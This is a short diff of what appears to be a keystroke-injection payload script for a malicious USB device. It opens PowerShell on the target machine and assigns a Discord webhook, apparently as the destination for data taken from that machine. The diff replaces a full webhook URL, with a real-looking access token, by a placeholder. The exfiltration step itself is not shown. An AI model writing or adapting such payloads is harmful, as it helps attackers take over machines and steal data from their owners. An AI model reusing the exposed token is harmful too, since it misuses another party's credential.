@@ -10,7 +10,7 @@ DELAY 250
 STRING powershell
 ENTER
 DELAY 650
-STRING $webhook='https://discord.com/api/webhooks/1021971857781575740/26f-4or-ilgbgfIAuqoWBTb82VwiJoZxchUwAeLGmAxQLvFYPa78tRn0QyneaBm8gwAq'
+STRING $webhook='WEBHOOK_ADDRESS'
 ENTER
 DELAY 1500
 STRING pwsh
